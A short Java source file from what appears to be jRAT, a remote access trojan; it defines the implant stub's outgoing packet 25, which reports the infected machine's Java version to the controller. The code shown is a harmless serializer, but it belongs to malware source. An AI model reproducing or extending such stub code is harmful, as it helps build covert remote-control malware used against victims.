package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet25InitJavaVersion extends AbstractOutgoingPacket {

	private String version;

	public Packet25InitJavaVersion(String version) {
		this.version = version;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(version);
	}

	@Override
	public byte getPacketId() {
		return (byte) 25;
	}

}
